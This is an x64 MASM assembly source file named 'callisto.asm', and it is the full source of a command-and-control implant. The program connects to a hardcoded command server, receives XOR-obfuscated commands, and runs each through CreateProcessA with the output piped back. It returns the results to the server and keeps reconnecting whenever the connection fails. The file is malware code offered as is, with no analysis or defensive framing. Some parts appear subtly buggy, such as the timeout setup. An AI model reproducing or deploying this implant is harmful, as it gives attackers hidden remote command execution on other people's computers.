;  <callisto.asm>   -   Callisto source
;                         Copyright (c) 2020 by Joshua Finley.
;

option win64:3      ; init shadow space, reserve stack at PROC level

include ..\include\kernel32.inc
include ..\include\winsock.inc
include ..\include\ntdll.inc

status_failure  equ 0xffffffff
status_success  equ 0

; Shellcode commands
buffer_size     equ 1024
cmd_null        equ 0000b
cmd_hello       equ 0001b
cmd_ready       equ 0010b
cmd_exec        equ 0100b
cmd_exit        equ 1000b

; Function prototypes
memcpy      proto   fastcall :qword, :qword, :dword
xor_cipher  proto   fastcall :qword, :byte, :dword
system_exec proto   fastcall :qword, :qword

_data$00 segment page 'data'
    g_command_ip        db "127.0.0.1", 0
    g_command_port      dw 1664
    g_timeout             timeval <>
    g_timeout_sec       dw 5
    g_timeout_usec      dw 0
_data$00 ends

_text$00 segment align(10h) 'code'

    main proc
        local socket_buffer[buffer_size]:byte
        local output_buffer[buffer_size]:byte
        local wsa_data:wsadata
        local sock_addr:sockaddr_in
        local dw_socket:dword
        local dw_socket_buffer_size:dword
        local cipher_key:byte
        ; Initialize Winsock
        invoke WSAStartup, 516, addr wsa_data
        test eax, eax
        jnz _exit
        
        ; Create a socket
    _connect:
        invoke socket, af_inet, sock_stream, ipproto_tcp
        cmp eax, socket_error
        je _exit
        mov dw_socket, eax

        ; Setup connection information
        invoke RtlZeroMemory, addr sock_addr, sizeof sockaddr_in
        invoke inet_addr, addr g_command_ip
        mov sock_addr.sin_addr, eax
        mov sock_addr.sin_family, af_inet
        invoke htons, g_command_port
        mov sock_addr.sin_port, ax

        ; Set receive timeout
        mov ax, g_timeout_sec
        mov g_timeout.tv_sec, ax
        mov ax, g_timeout_usec
        mov g_timeout.tv_usec, ax
        invoke setsockopt, dw_socket, sol_socket, so_rcvtimeo, addr g_timeout_sec, sizeof timeval
        cmp eax, socket_error
        je _exit

        ; Connect to command server 
        invoke connect, dw_socket, addr sock_addr, sizeof sock_addr
        cmp eax, socket_error
        je _exit

        ; Send the client hello
        invoke RtlZeroMemory, addr socket_buffer, buffer_size
        mov byte ptr [socket_buffer], cmd_hello
        invoke send, dw_socket, addr socket_buffer, sizeof byte, 0

        ; Check server hello
        invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
        cmp eax, socket_error
        je _exit
        cmp byte ptr [socket_buffer], cmd_hello
        jne _exit

        ; Successfuly connected to command server; await commands
        .while 1
            ; Signal the client is ready
            invoke RtlZeroMemory, addr socket_buffer, buffer_size
            mov byte ptr [socket_buffer], cmd_ready
            invoke send, dw_socket, addr socket_buffer, sizeof byte, 0
            .if eax == socket_error
                jmp _reconnect
            .endif

            ; Check if the server is ready
            mov byte ptr [socket_buffer], 0
            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
            .if eax == socket_error
                jmp _reconnect
            .endif
            cmp byte ptr [socket_buffer], cmd_ready
            
            ; If nothing sent
            .if eax == 0
                .continue   
            .elseif byte ptr [socket_buffer] == cmd_exit ; exit now
                jmp _reconnect
            .endif

            ; Check if command key sent
            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
            .if eax == socket_error
                jmp _reconnect
            .elseif byte ptr [socket_buffer] != cmd_exec
                jmp _reconnect
            .endif

            ; Receive the next cipher key
            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
            cmp eax, socket_error
            je _reconnect
            mov al, byte ptr [socket_buffer]
            mov [cipher_key], al

            ; Receive the next command
            invoke recv, dw_socket, addr socket_buffer, buffer_size, 0
            cmp eax, socket_error
            je _reconnect

            ; Continue if the server has nothing for the client
            .if eax == 0
                .continue
            .endif

            ; Save the size of the last command
            mov dw_socket_buffer_size, eax
            
            ; Check if exit command was sent
            mov al, byte ptr [socket_buffer]
            cmp al, cmd_exit
            je _exit

            ; Decipher the supplied command
            invoke xor_cipher, addr socket_buffer, cipher_key, buffer_size

            ; Run the supplied command 
            invoke system_exec, addr socket_buffer, addr output_buffer
            .if eax == status_failure
                .continue
            .endif
            
            ; Return the result
            invoke send, dw_socket, addr output_buffer, eax, 0
            .continue
        .endw
        jmp _reconnect
    _exit:
        invoke WSACleanup
        ret

    _reconnect:
        invoke shutdown, dw_socket, sd_both
        invoke closesocket, dw_socket
        invoke Sleep, 1000
        jmp _connect
    main endp

    xor_cipher proc fastcall uses rbx r8, buffer_addr:qword, key:byte, xor_buffer_size:dword
        mov dl, key                 ; Move the XOR key into rdx
        mov r8d, xor_buffer_size    ; Move the size into r8 (loop counter)
        
    _xor_next_byte:
        lea rbx, [rcx + r8 - 1]     ; Load effective address of the current byte
        xor rax, rax                ; Clear rax (ensure only lower 8 bits are used)
        movzx rax, byte ptr [rbx]   ; Move the byte into al, zero-extending to rax
        xor al, dl                  ; XOR the byte with the key
        mov [rbx], al               ; Store the result back into the buffer
        dec r8                      ; Decrement the loop counter
        jne _xor_next_byte          ; Jump if there are more bytes to process
        ret
    xor_cipher endp

    system_exec proc fastcall, system_exec_buffer:qword, out_buffer:qword
        local pipe_buffer[buffer_size]:byte
        local s_info:startupinfoa
        local p_info:process_information
        local sa:security_attributes
        local h_stdout_write:qword
        local h_stdout_read:qword
        local bytes_read:dword
        local status:dword

        invoke RtlZeroMemory, addr s_info, sizeof startupinfoa
        invoke RtlZeroMemory, addr p_info, sizeof process_information
        invoke RtlZeroMemory, addr sa, 0x18
        invoke RtlZeroMemory, addr pipe_buffer, buffer_size
        
        ; Setup security attributes struct
        mov sa.nLength, 0x18
        mov sa.lpSecurityDescriptor, 0
        mov sa.bInheritHandle, 1

        ; Create a pipe for the child process's STDOUT
        invoke CreatePipe, addr h_stdout_read, addr h_stdout_write, addr sa, 0
        test eax, eax
        jz _error

        ; Ensure the read handle is not inherited
        invoke SetHandleInformation, h_stdout_read, handle_flag_inherit, 0
        test eax, eax
        jz _error

        ; Setup the startup information strucet
        mov rax, h_stdout_write
        mov s_info.cbSize, sizeof startupinfoa
        mov s_info.hStdError, rax
        mov s_info.hStdOutput, rax
        invoke GetStdHandle, std_input_handle
        mov s_info.hStdInput, rax
        mov s_info.dwFlags, startf_usestdhandles
        
        ; Ensure the buffer is null-terminated
        mov rcx, system_exec_buffer
        add rcx, buffer_size -1
        mov byte ptr [rcx], 0

        ; Spawn the child process
        invoke CreateProcessA, 0, system_exec_buffer, 0, 0, 1, 0, 0, 0, addr s_info, addr p_info
        .if eax == 0
            jmp _error
        .endif

        ; Close the write end of the pipe before reading from the read end
        invoke CloseHandle, h_stdout_write
        .if eax == 0
            jmp _error
        .endif

        ; Read the process output
        ; Note: This only handles the first 1024 bytes
        invoke ReadFile, h_stdout_read, addr pipe_buffer, buffer_size - 1, addr bytes_read, 0
        .if eax == 0
            invoke GetLastError
            cmp eax, error_handle_eof
            je _done_reading
            jmp _error
        _done_reading:
            jmp _success
        .endif

        mov eax, bytes_read
        mov dword ptr [status], eax
        invoke RtlCopyMemory, out_buffer, addr pipe_buffer, bytes_read

        ; Wait for the child process to exit
        invoke WaitForSingleObject, p_info.hProcess, infinite

        _success:
            mov eax, bytes_read
            mov dword ptr [status], eax
            jmp _exit
        _error:
            mov dword ptr [status], status_failure
        _exit:
            .if p_info.hProcess != -1 && p_info.hProcess != 0
                invoke CloseHandle, p_info.hProcess
            .endif
            .if p_info.hThread != -1 && p_info.hThread != 0
                invoke CloseHandle, p_info.hThread
            .endif
            .if h_stdout_read != -1 && h_stdout_read != 0
                invoke CloseHandle, h_stdout_read
            .endif

            mov eax, dword ptr [status]
            ret
    system_exec endp

_text$00 ends

end